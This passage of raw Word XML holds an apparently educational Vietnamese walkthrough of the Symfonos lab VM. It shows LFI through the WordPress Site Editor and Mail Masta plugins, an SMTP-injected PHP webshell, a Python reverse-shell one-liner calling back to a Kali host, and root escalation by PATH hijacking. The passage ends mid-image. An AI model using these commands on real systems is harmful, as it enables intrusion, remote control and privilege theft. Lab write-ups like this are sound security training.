      </w:r>
    </w:p>
    <w:p w14:paraId="548495F1" w14:textId="77777777" w:rsidR="00094E12" w:rsidRDefault="00094E12">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C444BF2" wp14:editId="3A74745C">
            <wp:extent cx="6217920" cy="3001010"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="4568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7324" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3001010"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCE21AE" w14:textId="259C78A6" w:rsidR="00094E12" w:rsidRDefault="00094E12" w:rsidP="00094E12">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7ECD46D3" wp14:editId="26E9DF8A">
            <wp:extent cx="6217920" cy="4194810"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="7398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14324" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4194810"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="262E9584" w14:textId="34C06C72" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="550D111A" wp14:editId="7DC026E7">
            <wp:extent cx="6217920" cy="2169160"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:docPr id="183180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04972" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2169160"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="647C7D25" w14:textId="3A0E5D51" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r>
        <w:t xml:space="preserve">Truy cập vào đường link vừa tìm được </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidRPr="003D6DF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://seclists.org/fulldisclosure/2018/Mar/40</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15E81C8D" w14:textId="77777777" w:rsidR="00167BD2" w:rsidRPr="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00167BD2">
      <w:r>
        <w:t xml:space="preserve">Copy đonạ mã </w:t>
      </w:r>
      <w:r w:rsidRPr="00167BD2">
        <w:t>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A26580A" w14:textId="3B7D2D41" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r>
        <w:t xml:space="preserve">Rồi đưa vào đường dẫn khiến nó trở thành </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r w:rsidRPr="00167BD2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.56.118/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="47821379" w14:textId="036280A7" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r w:rsidRPr="00167BD2">
        <w:lastRenderedPageBreak/>
        <w:t>Kết quả trả về nội dung tệp /etc/passwd của máy mục tiêu. Qua đó xác định được tài khoản người dùng helios, có UID và GID là 1000, thư mục cá nhân /home/helios và sử dụng shell /bin/bash. Đây là tài khoản có khả năng đăng nhập tương tác vào hệ thống. Ngoài ra còn phát hiện các tài khoản dịch vụ như www-data, mysql, postfix và sshd, nhưng các tài khoản này chủ yếu sử dụng /usr/sbin/nologin hoặc /bin/false.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC0BE63" w14:textId="46B28407" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="497FE818" wp14:editId="22FCD4A8">
            <wp:extent cx="6217920" cy="3642360"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="58090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6020" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3642360"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1A8BAD" w14:textId="66C48596" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C45B585" wp14:editId="0C5BE450">
            <wp:extent cx="6217920" cy="807085"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="209148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9591" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="807085"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D07C29D" w14:textId="24F1ADB0" w:rsidR="00167BD2" w:rsidRDefault="00167BD2" w:rsidP="00094E12">
      <w:r w:rsidRPr="00167BD2">
        <w:t>Sau khi xác định lỗ hổng Local File Inclusion tại plugin Site Editor, tiến hành thay đổi tham số ajax_path thành /var/mail/helios. Kết quả cho thấy ứng dụng có khả năng truy cập hộp thư cục bộ của người dùng helios. Do dịch vụ SMTP đang hoạt động trên cổng 25, nội dung gửi đến tài khoản này có thể được ghi vào file /var/mail/helios. Đây là cơ sở để kiểm tra kỹ thuật SMTP mail poisoning kết hợp với LFI nhằm đánh giá khả năng thực thi mã trên máy chủ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C96906F" w14:textId="4675827A" w:rsidR="003056E5" w:rsidRDefault="003056E5" w:rsidP="00094E12">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="251B5412" wp14:editId="7B670731">
            <wp:extent cx="6217920" cy="1331595"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="29250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8259" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1331595"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="22515D64" w14:textId="1EECC4AC" w:rsidR="003056E5" w:rsidRPr="00094E12" w:rsidRDefault="003056E5" w:rsidP="00094E12">
      <w:r w:rsidRPr="003056E5">
        <w:lastRenderedPageBreak/>
        <w:t>Bằng cách khai thác lỗ hổng LFI với đường dẫn /var/mail/helios, hệ thống trả về nội dung hộp thư của người dùng helios. Kết quả xác nhận dịch vụ thư Postfix đang lưu email cục bộ và phát hiện email thông báo cài đặt WordPress tại đường dẫn /h3l105, với tài khoản quản trị admin. Tuy nhiên, mật khẩu không được hiển thị trực tiếp trong nội dung thư.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288FD2AD" w14:textId="77777777" w:rsidR="00094E12" w:rsidRPr="00094E12" w:rsidRDefault="00094E12" w:rsidP="00094E12"/>
    <w:p w14:paraId="35435BC1" w14:textId="323A2D2F" w:rsidR="006803BF" w:rsidRDefault="003056E5">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>. Gửi mã PHP qua SMTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7423BFE5" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đưa một đoạn PHP vào hộp thư helios để kiểm tra khả năng thực thi lệnh.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A85AAA8" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F0A941" w14:textId="6B2BD202" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">telnet </w:t>
      </w:r>
      <w:r w:rsidR="00881693">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> 25</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F99DB42" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>MAIL FROM: jesse@symfonos.localdomain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7D591A" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>RCPT TO: helios@symfonos.localdomain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD02A76" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>DATA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF9DFFD" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&lt;?php system($_GET['cmd']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5012AEC5" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>QUIT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C7AECE" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kết nối tới SMTP và gửi mã PHP vào hộp thư helios. Sau đó hộp thư được đọc lại qua LFI để kiểm tra thực thi lệnh.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42ACDC8A" w14:textId="155F97FC" w:rsidR="006803BF" w:rsidRDefault="003056E5">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F564A9C" wp14:editId="030967F2">
            <wp:extent cx="6217920" cy="2074545"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="135863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38718" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2074545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>6. Tạo reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C957B3D" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác nhận thực thi lệnh và mở kết nối shell ngược về máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA5BC96" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A408FD9" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DB4B02" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>nc -nlvp 443</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD930AB" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.105",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732CD8A6" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh id xác nhận mã PHP hoạt động. Netcat lắng nghe trên Kali tại cổng 443, sau đó Python kết nối ngược về 192.168.56.105.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352CDBE8" w14:textId="77777777" w:rsidR="00F72BB5" w:rsidRDefault="003056E5">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0ACE6513" wp14:editId="284FA2EB">
            <wp:extent cx="6217920" cy="2379980"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="114172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23463" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2379980"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00F72BB5" w:rsidRPr="00F72BB5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F72BB5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73FF4FE2" wp14:editId="4659D9DA">
            <wp:extent cx="6217920" cy="386080"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="81315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9179" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="386080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA84AB0" w14:textId="1693618C" w:rsidR="00F72BB5" w:rsidRDefault="00F72BB5" w:rsidP="00F72BB5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2F11E677" wp14:editId="0F4A3206">
            <wp:extent cx="6217920" cy="1210945"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="75610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02219" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1210945"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D96C12D" w14:textId="781B65E4" w:rsidR="00F72BB5" w:rsidRPr="00F72BB5" w:rsidRDefault="00F72BB5" w:rsidP="00F72BB5">
      <w:r w:rsidRPr="00F72BB5">
        <w:t>Kết quả kiểm tra bằng tham số cmd=id cho thấy payload PHP trong tệp thư /var/mail/helios đã được thực thi thành công thông qua lỗ hổng LFI của plugin Mail Masta. Sau đó, máy Kali mở Netcat ở cổng 443 để chờ kết nối. Khi payload Python được gọi, máy mục tiêu đã chủ động kết nối ngược về địa chỉ 192.168.56.105:443, từ đó thiết lập được reverse shell. Điều này chứng minh lỗ hổng có thể bị khai thác từ đọc tệp cục bộ thành thực thi lệnh từ xa trên hệ thống mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50769509" w14:textId="77777777" w:rsidR="00F72BB5" w:rsidRPr="00F72BB5" w:rsidRDefault="00F72BB5" w:rsidP="00F72BB5"/>
    <w:p w14:paraId="47D3505B" w14:textId="00075AA3" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>7. Leo thang đặc quyền bằng PATH hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BE7E71" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tìm tệp SUID root và lợi dụng chương trình /opt/statuscheck gọi curl theo biến PATH.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77055E2F" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FB2690" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>export TERM=screen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750334F5" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/usr/bin/sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17138242" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6278DD24" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/opt/statuscheck</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C88CA3" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>curl -I http://localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C82BE6" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd /tmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B48D27F" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>echo "/bin/sh" &gt;&gt; curl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C037F6" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>chmod 755 curl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302FD2CD" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>export PATH=/tmp:$PATH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B6D4D2" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/opt/statuscheck</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420F47AB" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python -c 'import pty; pty.spawn("/bin/sh")'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3D3A9E" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tạo tệp curl giả trong /tmp, cấp quyền thực thi và đưa /tmp lên đầu PATH. Khi /opt/statuscheck gọi curl không dùng đường dẫn tuyệt đối, tệp giả được chạy và sinh shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEFD944" w14:textId="77777777" w:rsidR="00FB1DF1" w:rsidRDefault="00FB1DF1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F41050D" wp14:editId="734AAD5A">
            <wp:extent cx="6217920" cy="4001135"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="162477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78273" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
